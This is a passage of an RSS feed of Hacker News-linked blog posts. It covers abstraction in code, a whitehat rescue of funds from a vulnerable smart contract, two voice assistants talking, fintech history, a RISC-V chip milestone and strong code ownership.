}</code></pre><h2>The key advantage is that the user gets the most power</h2><p>The building blocks that we just built, can be used in a myriad of ways. The user can support CSV, XML, can use <code>isLoading</code> with some other function, and choose to provide a different kind of <code>exportableData</code>.  We√¢‚Ç¨‚Ñ¢ve provided a lot of power for the user.</p><h2>The key disadvantage is that you are the most vulnerable to mistakes</h2><p>The disadvantage though, like in the case of inversion, is that we open ourselves up to a lot of mistakes. What if <code>isLoading</code> was really meant for files, and other things should have been using a different flag? What if people start using <code>saveJSONFile</code>, and pass data that wasn√¢‚Ç¨‚Ñ¢t really an export? These are all cases that we have implicitly allowed with our abstractions. </p><p>There√¢‚Ç¨‚Ñ¢s a further problem: notice that with our first example of <code>exportFile</code>, you the code was more concrete: you could see what was actually happening. When code is more abstract, it√¢‚Ç¨‚Ñ¢s a bit harder to reason about what is <em>actually</em> happening. Now, it can be worth it for the power gains, but if you optimized prematurely, you√¢‚Ç¨‚Ñ¢re just paying this price for nothing. An example of this unnecessary price is <code>saveJSONFile</code> and <code>saveCSVFile</code> √¢‚Ç¨‚Äù if we had <a href="http://number-none.com/blow/john_carmack_on_inlined_code.html" target="_blank">inlined</a> those, the overall composition would still be abstract but more understandable. These are the kind of things to watch out for as you abstract at this level.</p><h2>Composition is at the end of the spectrum</h2><p>And with that, we see that composition gives us the most power, but gives us the most opportunities to shoot ourselves in the foot. Boy can it be worth it though. </p><p>It√¢‚Ç¨‚Ñ¢s funny to notice that with each option, the pro <em>is</em> the con. So how do we pick? I think one heuristic you can use is this: pick the most powerful option you can limited by your confidence. For example, if you have a light understanding of the problem, stay on the lower side of the abstraction spectrum. As you understand more (say, time to introduce XML) you can evolve to the powerful side of the spectrum. When you√¢‚Ç¨‚Ñ¢re <em>very</em> confident, and you can see good use-cases for your building blocks, lean to the most powerful side of the spectrum. </p><p><em>Thanks to Daniel Woelfel, Alex Reichert, Julien Odent for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>
            </description>
            <link>https://stopa.io/post/251</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580885</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping the Dark Forest]]>
            </title>
            <description>
<![CDATA[
Score 315 | Comments 134 (<a href="https://news.ycombinator.com/item?id=24580879">thread link</a>) | @CyrusL
<br/>
September 24, 2020 | https://samczsun.com/escaping-the-dark-forest/ | <a href="https://web.archive.org/web/*/https://samczsun.com/escaping-the-dark-forest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://samczsun.com/content/images/size/w300/2020/09/109768371_xl.jpg 300w,
                            https://samczsun.com/content/images/size/w600/2020/09/109768371_xl.jpg 600w,
                            https://samczsun.com/content/images/size/w1000/2020/09/109768371_xl.jpg 1000w,
                            https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg" alt="Escaping the Dark Forest">
</figure>
<section>
<div>
<p><em>On September 15, 2020, a small group of people worked through the night to rescue over 9.6MM USD from a vulnerable smart contract. This is our story.</em></p><p>I was about to wrap up for the night when I decided to take another look at some smart contracts.</p><p>I wasn‚Äôt expecting anything interesting, of course. Over the past few weeks I had seen countless yield farming clones launch with the exact same pitch: stake your tokens with us and you could be the next cryptocurrency millionaire. Most were simply forks of well-audited code although some tweaked bits and pieces, sometimes with catastrophic results.</p><p>But amidst all of the noise there was some code I hadn‚Äôt seen before. The contract held over 25,000 Ether, worth over 9,600,000 USD at the time, and would be a very juicy payday for anyone who managed to find a bug in its logic.</p><p>I quickly looked through the code for where Ether is transferred out and found two hits. One of them transferred the Ether to a hardcoded token address, so that could be ignored. The second was a burn function that transferred Ether to the sender. After tracing the usage of this function, I discovered that it would be trivial for anyone to mint tokens to themselves for free, but then burn them in exchange for all of the Ether in the contract. My heart jumped. Suddenly, things had become serious.</p><p>Some digging revealed that the contract I had found was part of <a href="https://lien.finance/">Lien Finance</a>‚Äôs protocol. Unfortunately, their team was anonymous! The only IM platform they supported was Telegram, and I couldn‚Äôt be sure that the admins of that channel were actually protocol developers or just a few early supporters. The last thing I wanted to do was accidentally leak the exploit to the wrong person.</p><p>After browsing their website a little while longer, I noticed that they had worked with ConsenSys Diligence and CertiK for an audit. This seemed like a good avenue, since both ConsenSys and CertiK must have interacted with the developers during their audits. I quickly pinged <a href="https://twitter.com/maurelian_">maurelian</a> on Telegram.</p><figure><img src="https://samczsun.com/content/images/2020/09/image.png" alt=""><figcaption>You never want to be on the receiving end of this message</figcaption></figure><p>Unfortunately, time ticked on, my heart kept pounding, but there was no response from maurelian. It seemed like he had already gone to sleep. Desperate, I sent a message to the ETHSecurity Telegram channel.</p><figure><img src="https://samczsun.com/content/images/2020/09/image-1.png" alt=""><figcaption>Artist's rendering of the message, since I deleted the original</figcaption></figure><p>Within minutes, I got a message from someone I‚Äôd worked with quite a few times in the past - <a href="https://twitter.com/wadealexc">Alex Wade</a>.</p><hr><p>My head had just hit the pillow when I got a knock on my door. It was my roommate: ‚ÄúSam‚Äôs in the ETHSec Telegram asking for anyone from Diligence.‚Äù</p><figure><img src="https://samczsun.com/content/images/2020/09/image-2.png" alt=""><figcaption>It was, in fact, a long night</figcaption></figure><p>Knowing Sam, this couldn‚Äôt be good. I found a channel we‚Äôd set up with Lien a few months ago and an email address. Better than nothing, given their team was anon.</p><p>I was still half asleep. Sam, not wanting to commit details to text, asked for a Zoom call. Groggily wishing I was back in bed, I attempted to gauge the severity of the situation:</p><figure><img src="https://samczsun.com/content/images/2020/09/image-4.png" alt=""><figcaption>Five minutes later, it was clear that the situation called for coffee</figcaption></figure><p>Sam and I reviewed the code together. By this point, Sam had already prepared a sample exploit and was able to confirm the issue on his machine. The conversation quickly turned to discussing options:</p><ol><li>Attempt to exploit the issue ourselves.</li><li>Reach out to Lien and have them go public, urging users to withdraw.</li></ol><p>Neither of these were appealing options. The first was risky because, as discussed in <a href="https://medium.com/@danrobinson/ethereum-is-a-dark-forest-ecc5f0505dff">Ethereum is a Dark Forest</a> by <a href="https://twitter.com/danrobinson">Dan Robinson</a> and <a href="https://twitter.com/gakonst/">Georgios Konstantopoulos</a>, the possibility of our transactions getting frontrun was very real. The second option was similarly risky, as a public announcement would draw attention to the problem and create a window of opportunity for attackers. We needed a third option.</p><p>Recalling a section from <em>Ethereum is a Dark Forest</em>, Sam reached out to <a href="https://twitter.com/epheph">Scott Bigelow</a>:</p><blockquote>If you find yourself in a situation like this, we suggest you reach out to Scott Bigelow, a security researcher who has been studying this topic and has a prototype implementation for a better obfuscator.</blockquote><hr><p>After participating in the recovery attempt from <em>Ethereum is a Dark Forest, </em>which ultimately lost to front-runners, I was hungry for a re-match. I‚Äôve spent time monitoring front-running and designing a simple system that seemed able to fool generalized front-runners, at least for the $200 I‚Äôd been able to test it with. When Sam reached out to me in the late evening with the innocent-sounding ‚Äúmind staying up for another hour or so‚Äù, I couldn‚Äôt wait to try it out! I was already working it out: how I‚Äôd make a few tweaks, stay up a couple hours, feel a sense of accomplishment having helped rescue and return a few thousand dollars of user funds, and get a good night‚Äôs sleep.</p><p>Those plans immediately fell apart when Sam shared the contract with me: ~25,000 ETH, valued at $9.6M, at stake. For as much as I wanted that rematch, $9.6M was way outside my humble script‚Äôs weight class.</p><p><br>For the past few months, I had been trying to establish contacts with miners for this very purpose: white-hat transaction cooperation. If ever there was a time to appeal to a miner to include a transaction without giving front-runners the chance to steal it, it was now. Luckily, <a href="https://twitter.com/tzhen">Tina</a> and I have worked together over the past few months on establishing this cooperation. It seemed like a slim chance at the time, but it was worth a shot: let‚Äôs bring Tina into the rescue attempt to work with a mining pool to mine a private transaction.</p><hr><p>I had just evacuated from the Bobcat forest fire and was sipping on unknown beachy drinks zoning out to the monotonic sound of dark Pacific waves, when a Telegram DM from Sam buzzed me back to a darker reality: ‚Äúfunds at risk, frontrunnable‚Äù. Over the last few weeks, I had been collaborating with Sam and Scott on a research project on MEV and could already guess their ask before they sent it: a direct channel to shield a whitehat tx from getting sniped by the ‚Äúadvanced predators‚Äù in the mempool‚Äôs ‚Äúdark forest‚Äù.</p><p>Since this was a risky move that entailed exposing our strategy to miners, we decided we should first try to get the greenlight from the anonymous Lien team. While Alex was trying to get in contact via ConsenSys-internal channels, we tried to loop in CertiK as well.</p><p>I realized it may take another 4 hours before Certik's US-based auditors would wake up, yet the clock was ticking. &nbsp;Knowing nothing much about CertiK beyond the fact it had serviced quite a few Asian projects, I tried to reach the CertiK China team to arbitrage the time zone difference. I blasted a casual sounding message in ‚ÄúDeFi the World‚Äù and ‚ÄúYellow Hats‚Äù WeChat groups. Four leads slid into my DMs independently within 30 minutes, confirming the WeChat ID that I connected with was indeed the real Zhaozhong Ni, CTO of CertiK. I was added to a WeChat group with 5 CertiK team members, yet at this point I was still not in a position to disclose the project nor the vulnerability. To minimize the exposure and potential liability, we could only invite one member from Certik to join our whitehat operation. After passing a final verification via official email, Georgios Delkos, the engineering lead at CertiK joined our call.</p><p>With Georgios‚Äôs help, Alex was able to quickly get in contact with the Lien team and verify their identity. We brought them up-to-speed on the current situation and asked for their permission to try working directly with a mining pool to rescue the vulnerable funds. After some deliberation, the Lien team agreed that the risk from trying to rescue the funds directly or publishing a warning was too high, and gave the go-ahead to continue.</p><p>Now we needed to identify a mining pool that had the infrastructure ready in place and would be willing to cooperate with us ASAP. Which mining pool should we tap? Which contact from the pool would be in a position to make technical decisions swiftly that help us beat the clock?</p><p>SparkPool came to mind, as I knew they had been working on a piece of public infrastructure called Taichi Network that could easily offer what we needed. I decided to ping Shaoping Zhang, SparkPool‚Äôs co-founder, who had helped me investigate mempool events in the past.</p><p>Half an hour later, Shaoping responded: ‚ÄúYou mean do we have a whitelist service for transactions? Sorry, we don‚Äôt.‚Äù Oops, something was lost in translation, ‚Äúwhitehat‚Äù and ‚Äúwhitelist‚Äù sounded similar in Chinese.</p><p>‚ÄúThere‚Äôs 10mn dollar worth of funds at risk. samczsun is on the line.‚Äù I tried again to communicate the situation without revealing any specifics.</p><figure><img src="https://samczsun.com/content/images/2020/09/photo5145442418169063579.png" alt="" srcset="https://samczsun.com/content/images/size/w600/2020/09/photo5145442418169063579.png 600w, https://samczsun.com/content/images/size/w1000/2020/09/photo5145442418169063579.png 1000w, https://samczsun.com/content/images/size/w1600/2020/09/photo5145442418169063579.png 1600w, https://samczsun.com/content/images/2020/09/photo5145442418169063579.png 1920w" sizes="(min-width: 720px) 720px"></figure><p>‚ÄúAre you guys saving the world again? Do you need help from our mining pool?‚Äù To my surprise and great relief, Shaoping jokingly extended an offer to help. After official email verification, Shaoping popped into our marathon Zoom call with the support of a roomful of SparkPool devs.</p><hr><p>After lunch, just when I was about to take a nap, I received a message from Tina: ‚ÄúHas SparkPool ever helped with whitehat transactions??‚Äù I mistook it for whitelisting a transaction at first. No whitehats had approached us before, and we were not familiar with what ‚Äúwhitehat transactions‚Äù entailed. After Tina explained it in more details, I realized that what they needed was a private transaction service, i.e. the whitehats wanted to send transactions to save a DeFi contract, but in order to prevent getting front-runned, they needed a mining pool to include the transaction without broadcasting it.</p><p>We had been working on a ‚Äúprivate transaction‚Äù feature on our Taichi Network, which was still under development and had not been tested. I brought the whitehats‚Äô request to our development team, and explained the urgency: our private transaction feature needed to be in production within a few hours. Our devs said they could try their best to finish in time, and we immediately got to work. We finished development of the private transaction feature in 2 hours, and then spent some time fixing bugs.</p><p>After we completed our internal testing, we sent the <em>whitehat.taichi.network</em> endpoint to ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://samczsun.com/escaping-the-dark-forest/">https://samczsun.com/escaping-the-dark-forest/</a></em></p>]]>
            </description>
            <link>https://samczsun.com/escaping-the-dark-forest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580879</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Duplex Talks to an Automated Restaurant Conversational System]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580868">thread link</a>) | @kololski
<br/>
September 24, 2020 | https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/ | <a href="https://web.archive.org/web/*/https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
				<div>
				
													<p><img src="https://www.polyai.com/wp-content/uploads/2019/08/nikola-1-500x500.jpg"></p><div>
							<h6>Nikola Mrk≈°iƒá</h6>
							<p><span>
								23 Sep 2020								- 5 minutes read							</span>
						</p></div>
						
										
				</div>
			</div><div>
									<p>This summer, Google has been deploying its AI voice assistant called Duplex to call bars and restaurants in order to update their opening hours on Google Maps listings.<br>
Here‚Äôs a call their system had with our virtual assistant for restaurants.</p>
<p><iframe src="https://player.vimeo.com/video/460586741" width="640" height="360" frameborder="0" allowfullscreen="allowfullscreen"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span></iframe></p>
<p>As far as we‚Äôre aware, this is the <strong>first naturally-occurring conversation between AI voice assistants in the wild</strong>. I have never seen anything like this before, and I‚Äôm incredibly proud that PolyAI is sharing this moment in computing history with our friends from Google.</p>
<p>After listening to the call, we‚Äôd say that it went pretty well! Google could have handled the two-part opening hours a bit better, but overall, the interaction was smooth. I want to share a few thoughts on what this means for the future of conversational technologies.</p>
<h3>Human language is a Universal API</h3>
<p>This interaction did not need to be a conversation in the way that we as humans think of it. The caller‚Äôs request was transactional and to the point. An API call or an HTTPS request between two web services would have done the job in 150ms, instead of two minutes of synthesized voice going back and forth across the telephone line. However, such APIs are not always available, or standardised. For instance, there are dozens of reservation APIs for restaurants used in the UK alone, and voice assistants will never integrate with every single one.</p>
<p>This kind of machine-to-machine conversational communication will become more commonplace as AI deployment accelerates. And while it may seem like an overkill from a technical standpoint, there are good reasons for these kinds of interactions to be conversational, rather than API calls.</p>
<p>Imagine you ask your virtual assistant ‚Äî Siri or Alexa, for example ‚Äî to book a hotel room. It can phone multiple hotels to check availability and book without having to integrate into each hotel‚Äôs individual booking API. And logs of the conversation can inform the user of alternative venues for their next trip.</p>
<h3>Welcome to the Uncanny Valley</h3>
<p>Google introduced <a href="https://ai.googleblog.com/2018/05/duplex-ai-system-for-natural-conversation.html">Duplex in May 2018</a> as an ‚ÄòAI system for accomplishing real-world tasks over the phone‚Äô. You may have seen this video of <a href="https://www.youtube.com/watch?v=D5VN56jQMWM">Sundar Pichai at Google I/O</a> using Duplex to make a restaurant reservation.</p>
<p>I‚Äôll be the first to point out how incredible Google‚Äôs TTS (text-to-speech) is in the Duplex/PolyAI call. It sounds like a human, much more so than our assistant does.</p>
<p>According to the <a href="https://en.wikipedia.org/wiki/Uncanny_valley">Uncanny Valley theory</a>, the more human-like a robot is, the more likely people are to feel positive towards it. However, at a certain point of human-likeness, the robot becomes a bit creepy, and people are repulsed by it.</p>
<p><img src="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png" alt="" width="588" height="387" srcset="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png 588w, https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley-300x197.png 300w" sizes="(max-width: 588px) 100vw, 588px"></p>
<p>In the Google/PolyAI call, Duplex really does sound like a human ‚Äì it does mention that it‚Äôs an automated service, but this is not enough. Why? Because crossing the Uncanny Valley means that a person on the call will treat the bot as though they are human.</p>
<p>Around the 1 minute mark, you‚Äôll hear our voice assistant ask the caller when they‚Äôd like to come in, and Duplex speaks over it. In reality, these are machines ‚Äì no-one‚Äôs getting offended. But when you listen to the call, the Duplex bot comes across as pretty rude. Because it sounds so human, it‚Äôs practically impossible to not attribute human qualities to the bot. And no one wants a rude voice assistant representing their company.</p>
<p><strong>Making customers think that your voice assistant is a real human is a sure-fire way to deliver frustrating customer experiences. At PolyAI, we work hard to make sure our voice assistants sit at the peak right before the Uncanny Valley ‚Äì but without crossing it. Warm and friendly enough to put callers at ease, but not real enough to cause cognitive dissonance.</strong></p>
<h3>The Future of Voice</h3>
<p>Companies are wising up to the benefits of conversational AI in customer communications, and we‚Äôll see a growing number of instances of machines communicating in human language. While this type of transactional communication may seem better suited to quick API calls, voice assistants can get the job done even when such APIs are not available.</p>
<p>We are super excited about the future of voice assistants. Two highly sophisticated voice assistants have now met in the wild, in a rerun of the legendary ‚ÄúDr Livingstone, I presume‚Äù moment (though neither assistant realised they were speaking to one of their own). This is a sign of great things to come. Stay tuned ‚Äì and get in touch with us if you want to build a great voice assistant for your brand.</p>
<p><strong>What do you think of the PolyAI vs Google Duplex call? Let us know on Twitter, <a href="https://twitter.com/poly_ai">@poly_ai</a>.</strong></p>
							</div></div>]]>
            </description>
            <link>https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580868</guid>
            <pubDate>Thu, 24 Sep 2020 17:08:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fintech Is Not New]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24580770">thread link</a>) | @mattmarcus
<br/>
September 24, 2020 | https://www.moderntreasury.com/journal/fintech-is-not-new | <a href="https://web.archive.org/web/*/https://www.moderntreasury.com/journal/fintech-is-not-new">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>There‚Äôs a myth going around now that fintech is a new industry, poised to take over, and that now that it‚Äôs here, every company will be a fintech company. The myth continues: some of the most promising new tech is of a new, different, novel flavor called ‚Äúfintech.‚Äù</p><p>In reality, though, fintech is just as old as "tech." For as long as engineers and entrepreneurs have been coming up with new technology amongst the hills of Cupertino and the orange groves of Mountain View, there have been fintech entrepreneurs right amongst them. And in many instances, the two groups have utilized the same technology advances to push the world forward.</p><h5>1956</h5><p>In 1956, the same year that William Shockley founded the Shockley Semiconductor Laboratory in Palo Alto, Bill Fair and Earl Isaac set up Fair, Isaac, &amp; Company, better known today as <a href="https://www.fico.com/">FICO</a>.&nbsp;</p><p>Bill Fair and Earl Isaac met at the Stanford Research Institute in Menlo Park and worked on a project as data heavy as it gets: the mathematics and statistics behind credit scoring tools for lenders. In 1956 they moved up north, invested $400 each in their new company, and set off to sell credit assessment systems to lenders. The FICO score as we know it today, set on a scale between 300 and 850, was not formulated until the 1980s, but the <a href="https://www.fico.com/en/about-us#history%20(edited)" target="_blank">FICO concept</a> started simultaneously with the semiconductor. Today we‚Äôd describe what they were doing as ‚Äúdata science.‚Äù&nbsp;</p><p>‚Äç</p><h5>1957</h5><p>The very next year, in 1957, as Arthur Rock was making one of the first venture capital investments in Fairchild Semiconductor, Bank of America‚Äôs team in San Francisco was coming up with the BankAmericard program, which launched in 1958. The famous ‚ÄúFresno drop,‚Äù <a href="#1">[1]</a> in which BofA mailed credit cards to everyone in Fresno, became <a href="https://usa.visa.com/">Visa</a>. Like many consumer fintech startups, it was riddled with fraud at first. But it turned a profit in 1961 and the rest is <a href="https://usa.visa.com/about-visa/our_business/history-of-visa.html" target="_blank">history</a>. Visa, in its pursuit of the perfect payment experience at a store or restaurant, drove some of the most demanding requirements on data center reliability, redundancy, and latency in the 1970s. Today we‚Äôd describe these as ‚Äúcloud services.‚Äù&nbsp;</p><p>‚Äç</p><h5>1968</h5><p>In 1968, Robert Noyce, Gordon Moore, Andy Grove, and several other high profile Fairchild employees left Fairchild to start Intel. They too turned to Arthur Rock for seed funding. That was the year Ross Perot‚Äôs Electronic Data Systems IPO‚Äôd on the strength of multimillion dollar contracts building early software necessary to enable Medicare and Medicaid. EDS <a href="https://www.dxc.technology/about_us/ds/140019-our_history" target="_blank">built</a> the backends of ATMs, electronic funds transfer, and point-of-sale terminals for banks and credit unions. Today we‚Äôd probably describe EDS as a ‚Äúbanking core‚Äù or, at the very least, a ‚Äúsystems integrator‚Äù for banks‚Äîsystems that eventually came to run on Intel chips.&nbsp;</p><p>‚Äç</p><h5>1972</h5><p>In 1972, the year Steve Jobs graduated from high school, Charles Schwab‚Äôs new startup began offering brokerage services.<a href="#1">[1]</a> The company grew and expanded, and in 1979 Schwab spent a fortune on the ‚ÄúBETA‚Äù system, which stood for ‚ÄúBrokerage Execution and Transaction Analysis.‚Äù That was the same year Bill Gates and Paul Allen moved their fledgling startup from Albuquerque to Seattle, and renamed it Microsoft from the previous, awkward ‚ÄúMicro-Soft.‚Äù Steve Ballmer joined Microsoft the following year, the year that Schwab used its now-stable BETA system to offer 24 hour stock price quotes.&nbsp;</p><p>‚Äç</p><h5>1984</h5><p>In 1984, Apple released the Macintosh. That same year, a group of entrepreneurs started a startup bank aimed at serving the tech industry that the traditional banks didn‚Äôt want to serve. When they opened their first branch in Mountain View, they needed something to attract PR, and they decided to <a href="https://www.computerhistory.org/collections/catalog/102739976" target="_blank">borrow</a> bunny suits from their first customers, which were semiconductor companies. The grand opening landed them in the local papers as the Valley wondered what was going on with this upstart bank with ‚Äúbankers‚Äù dressed in bunny suits, but the message was clear. That bank is now the familiar banking institution we know today as <a href="https://www.svb.com/">Silicon Valley Bank</a>. Their strategy, of focusing on startups, was radical, but it worked.&nbsp;</p><p>‚Äç</p><h5>Today</h5><p>There may be no better time to build fintech companies. </p><p>There‚Äôs no good reason for payments to take three days to settle in 2020. There‚Äôs no good reason for the most sophisticated companies in the world to pay workers on a rigid bimonthly schedule. There‚Äôs no good reason why predatory payday lenders are the best option for millions to turn to in economic hardship. There‚Äôs no good reason for the government to disburse stimulus funds by paper check delivered via the postal service. Each of these is an opportunity to build a product of real consequence.&nbsp;</p><p>But this industry is not new. If anything, today‚Äôs companies are just an extension of a long tradition. Square, Stripe, Adyen, Plaid, Brex, Modern Treasury, and others all stand on the shoulders of giants. We benefit from FICO‚Äôs pioneering work in instant decision making, Visa‚Äôs mastery of electronic payment networks, and SVB‚Äôs startup-focused business model. </p><p>If we study the lessons of history, we will build products with more impact.<br></p></div></div></div>]]>
            </description>
            <link>https://www.moderntreasury.com/journal/fintech-is-not-new</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580770</guid>
            <pubDate>Thu, 24 Sep 2020 16:59:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shakti Announces Third Silicon Success with the Arduino-Compatible Moushik]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580748">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/ | <a href="https://web.archive.org/web/*/https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><b>The SHAKTI free and open source silicon project has reached another milestone with the boot up of the Moushik, an Arduino-compatible system-on-chip (SoC) and the group‚Äôs third successful silicon tape-out.</b></p>
<p>The SHAKTI project first announced its success in booting Linux on a home-grown RISC-V based processor <a href="https://abopen.com/news/shakti-project-boots-linux-on-home-grown-180nm-risc-v-silicon/">back in 2018</a>, initially on a chip built by US semiconductor giant Intel on a 22nm process, then on a chip built natively in India on a 180nm node at the ISRO Semiconductor Laboratory in Chandigarh.</p>
<p>Now, the SHAKTI team has announced its third physical chip: Moushik. ‚ÄúMoushik is a processor-cum-system on chip that would cater to the rapidly growing Internet of Things IOT devices that are integral part of smart cities of our digital India,‚Äù the team explains of the new device. ‚ÄúThree steps are involved in the making of a microprocessor chip: the design, the fabrication, and the post-silicon boot-up ‚Äì all these steps were done in India.</p>
<p>‚ÄúThe design was done in IIT Madras, the fabrication at the semiconductor laboratory Chandigarh, the motherboard printed circuit board design was done again at IIT Madras, manufacturing of this motherboard at Bengaluru assembly and post-silicon boot-up at IIT Madras.‚Äù</p>
<p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/KpRJe915-9I?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Again built on a 180nm process, Moushik has 103 input/output (IO) pins across a 256-pin package and is powered by the SHAKTI E-Class RISC-V core. The CPU runs at between 75MHz and 100MHz, while the SoC includes a number of common peripherals including an SDRAM controller, I¬≤C, quad-SPI, analogue-to-digital conversion (ADC), UART, and JTAG for debugging.</p>
<p>The motherboard, dubbed Adronics 1.0, includes support for Arduino ‚Äúshield‚Äù add-ons to speed embedded development. ‚ÄúIn addition the motherboard also has switcher ICs which enable power conversion across a large variety of voltages,‚Äù the team adds, ‚Äúthus enabling a variety of peripherals to be interfaceable with the motherboard. The PCB is a four layer motherboard with an input power of 12 volt at two amps.‚Äù</p>
<p>The chip can be seen going through the post-silicon boot-up process <a href="https://www.youtube.com/watch?v=KpRJe915-9I&amp;feature=youtu.be">in a video</a>, with more information available on the <a href="https://twitter.com/ShaktiProcessor/status/1308634777432461314?s=19">SHAKTI Twitter account</a>. For more information on the SHAKTI project in general, check out our interview with Arjun Menon and Rahul Bodduna in AB Open‚Äôs <a href="http://abopen.com/news/osddi-shakti-processor-iit-madras/">Open Source Digital Design Insights (OSDDI) series</a>.</p>

        </div></div>]]>
            </description>
            <link>https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580748</guid>
            <pubDate>Thu, 24 Sep 2020 16:57:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strong Code Ownership]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24580700">thread link</a>) | @aard
<br/>
September 24, 2020 | https://flatwire.org/2018/10/18/strong-code-ownership/ | <a href="https://web.archive.org/web/*/https://flatwire.org/2018/10/18/strong-code-ownership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-73">
	<!-- .entry-header -->

	<div>
		<p>Martin Fowler describes the three categories of code ownership utilized in most software projects:</p>
<blockquote><p>1. Strong code ownership breaks a code base up into modules (classes, functions, files) and assigns each module to one developer. Developers are only allowed to make changes to modules they own. If they need a change made to someone else‚Äôs module they need to talk to the module owner and get them to make the change. You can accelerate this process by writing a patch for the other module and sending that to the module owner.</p>
<p>2. Weak code ownership is similar in that modules are assigned to owners, but different in that developers are allowed to change modules owned by other people. Module owners are expected to take responsibility for the modules they own and keep an eye on changes made by other people. If you want to make a substantial change to someone else‚Äôs module it‚Äôs polite to talk it over with the module owner first.</p>
<p>3. Collective code ownership abandons any notion of individual ownership of modules. The code base is owned by the entire team and anyone may make changes anywhere. You can consider this as no code ownership, but it‚Äôs advocate prefer the emphasis on the notion of ownership by a team as opposed to an individual.¬π</p></blockquote>
<p>He continues to explain that, of the three, he only really dislikes strong code ownership and admits to a personal preference for ‚Äúthe dynamics of a collective code ownership‚Äù¬≤. Sadly, the agile community has largely followed suit with that opinion, and most companies now mandate that source code be modifiable by all. Such a policy comes at the expense of both quality and employee engagement. If you are aiming for a culture where engineers are both highly productive and take pride in their work, strong code ownership is your best option.</p>
<p>There are many compelling reasons to practice strong code ownership. I have written about some of them previously. In this essay, however, I want to visit the fascinating story of how China transformed itself economically by embracing the previously forbidden practice of ownership, or more specifically, the practice of allowing workers to reap the direct benefits of their labor.</p>
<p>In the 70‚Äôs, in China, there was no concept of private property. Farmers worked on collectives where the government took all that was produced and divided it equally among all families.</p>
<p>One such collective farm was located in the village of Xioagang where the people were struggling with a lack of food, resorting even to begging from other villages.</p>
<p>After realizing that something had to be done, secretly, they decided to parcel up their land among all the village families, allowing each to keep at least some of their own harvest, if it was bountiful enough.</p>
<p>They risked everything to try such an experiment as it was highly illegal, but in the end it was a great success. It netted a larger harvest ‚Äúthan in the previous 5 years combined‚Äù.</p>
<p>What was the difference? Just the rules of the game. In a word, ownership!</p>
<blockquote><p>It was the same land, the same tools and the same people. Yet just by changing the economic rules‚Ää‚Äî‚Ääby saying, you get to keep some of what you grow‚Ää‚Äî‚Ääeverything changed.¬≥</p></blockquote>
<p>Where before:</p>
<blockquote><p>There was no incentive to work hard‚Ää‚Äî‚Ääto go out to the fields early, to put in extra effort‚Å¥</p></blockquote>
<p>After the new arrangement, one could benefit from the fruits of their labor. They were the masters of their own fate.</p>
<p>Needless to say, it was not possible to hide their 5X increase in productivity from the government. But luckily, their actions where not viewed as treason but instead as instructional.</p>
<p>Among other reforms, China implemented the model of Xioagang‚Äôs partially privatized farm globally and ‚ÄúChina‚Äôs economy started to grow like crazy. Since 1978, something like 500 million people have risen out of poverty in China.‚Äù‚Åµ</p>
<p>What does ownership look like for software? How can you leverage the power of ownership to increase motivation and productivity in your organization? Obviously, developers don‚Äôt own their code in an absolute sense. When leaving a company, they can‚Äôt walk away with the code they wrote and use it somewhere else (unless it is open sourced). But they can own it in a way that gives the motivational benefits achieved but the Chinese Farmers of Xioagang. Parceling up the code base among coders makes everyone a custodian or steward over a piece of the application. They can be the guardian of its design, its test coverage, its coding standard. While taking pull requests, their detailed knowledge and emotional investment will make them rigorously attentive to what outside code can make it into their domain.</p>
<p>And what are the benefits that they reap from such efforts? The benefits are many:</p>
<ul>
